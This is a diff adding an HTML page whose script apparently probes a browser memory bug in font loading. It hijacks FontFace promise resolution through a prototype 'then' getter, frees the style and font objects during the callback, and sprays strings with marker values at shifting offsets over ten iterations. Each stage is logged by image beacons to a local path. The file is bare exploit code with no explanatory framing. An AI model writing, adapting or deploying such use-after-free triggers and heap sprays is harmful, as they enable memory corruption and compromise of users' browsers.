@@ -1,0 +1,53 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>sweep</title>
+<body><p>sweep</p>
+<script>
+function b(x){ var i=new Image(); i.src='/beacon/'+x+'?t='+Date.now(); }
+b('SW-PARSE');
+var it = 0, curIter = -1, fired = false, curStyle = '', PAY = '';
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function(){
+    if (fired) return undefined;
+    fired = true;
+    var i = curIter;
+    b('SW-'+i+'-GET');
+    var v = document.getElementById(curStyle);
+    if (v) v.remove();
+    try { document.fonts.delete(this); } catch(e){}
+    document.body.offsetHeight;
+    b('SW-'+i+'-LAY');
+    var keep = [];
+    for (var q = 0; q < 16; q++) keep.push(PAY);
+    b('SW-'+i+'-SPR-' + keep.length + '-' + keep[0].length);
+    return undefined;
+  },
+  set: function(){}
+});
+function step(){
+  if (it >= 10) { b('SW-DONE'); return; }
+  var i = it++;
+  curIter = i; fired = false; curStyle = 'vs'+i;
+  var pos = i * 2;
+  PAY = "\u0000".repeat(pos) + "\u4141\u4141" + "\u0000".repeat(126 - pos);
+  b('SW-'+i+'-START-pos' + pos);
+  var st = document.createElement('style');
+  st.id = curStyle;
+  st.textContent = "@font-face { font-family: x; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(st);
+  var A = new FontFace('a', 'local(Helvetica)', {unicodeRange: 'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  document.fonts.load('1em a, x', 'AB').then(
+    function(){ b('SW-'+i+'-RES'); },
+    function(){ b('SW-'+i+'-REJ'); }
+  );
+  setTimeout(function(){
+    try { document.body.offsetHeight; } catch(e){}
+    b('SW-'+i+'-END');
+    setTimeout(step, 60);
+  }, 120);
+}
+step();
+</script>
